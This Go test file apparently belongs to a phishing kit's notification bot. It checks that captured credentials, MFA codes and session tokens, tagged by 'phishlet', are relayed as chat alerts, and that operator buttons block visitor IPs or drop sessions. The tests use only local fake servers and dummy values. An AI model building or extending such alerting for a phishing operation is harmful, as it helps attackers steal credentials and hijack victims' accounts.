package notify

import (
	"context"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"
)

type fakeBus struct {
	chans map[string]chan any
}

func newFakeBus() *fakeBus {
	fb := &fakeBus{chans: map[string]chan any{}}
	for _, t := range []string{"capture.creds", "capture.mfa", "capture.token", "bot.blocked"} {
		fb.chans[t] = make(chan any, 32)
	}
	return fb
}

func (f *fakeBus) Subscribe(topic string, buf int) <-chan any { return f.chans[topic] }

func (f *fakeBus) emit(topic string, v any) { f.chans[topic] <- v }

func TestSendAndWatch(t *testing.T) {
	var posts []string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		posts = append(posts, r.URL.Path+" "+string(b))
		_, _ = w.Write([]byte(`{"ok":true}`))
	}))
	defer srv.Close()

	blocked := map[string]bool{}
	bot := &Bot{
		Token: "t", ChatID: "1", Base: srv.URL,
		Block: func(k, _ string) { blocked[k] = true },
	}
	fb := newFakeBus()
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	bot.Watch(ctx, fb)

	fb.emit("capture.creds", map[string]string{"session": "sess123456", "phishlet": "m1", "ip": "9.9.9.9"})
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) && len(posts) == 0 {
		time.Sleep(10 * time.Millisecond)
	}
	if len(posts) == 0 {
		t.Fatal("no alert sent")
	}
	if !strings.Contains(posts[0], "CREDS") || !strings.Contains(posts[0], "drop:sess123456") || !strings.Contains(posts[0], "block:9.9.9.9") {
		t.Fatalf("bad alert: %s", posts[0])
	}
}

func TestCallbackBlockDrop(t *testing.T) {
	calls := 0
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		calls++
		switch {
		case strings.HasSuffix(r.URL.Path, "/getUpdates") && calls == 1:
			_, _ = w.Write([]byte(`{"ok":true,"result":[{"update_id":7,"callback_query":{"id":"cb1","data":"block:9.9.9.9","from":{"id":1}}}]}`))
		case strings.HasSuffix(r.URL.Path, "/getUpdates"):
			_, _ = w.Write([]byte(`{"ok":true,"result":[]}`))
		default:
			_, _ = w.Write([]byte(`{"ok":true}`))
		}
	}))
	defer srv.Close()

	blocked := map[string]bool{}
	dropped := map[string]bool{}
	bot := &Bot{
		Token: "t", ChatID: "1", Base: srv.URL,
		Block: func(k, _ string) { blocked[k] = true },
		Drop:  func(_ context.Context, s string) error { dropped[s] = true; return nil },
	}
	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan struct{})
	go func() { bot.Poll(ctx); close(done) }()

	deadline := time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) && !blocked["9.9.9.9"] {
		time.Sleep(20 * time.Millisecond)
	}
	cancel()
	<-done
	if !blocked["9.9.9.9"] {
		t.Fatal("block callback not handled")
	}
	// drop-парсинг напрямую
	bot.handleCallback(context.Background(), "drop:abc")
	if !dropped["abc"] {
		t.Fatal("drop callback not handled")
	}
}
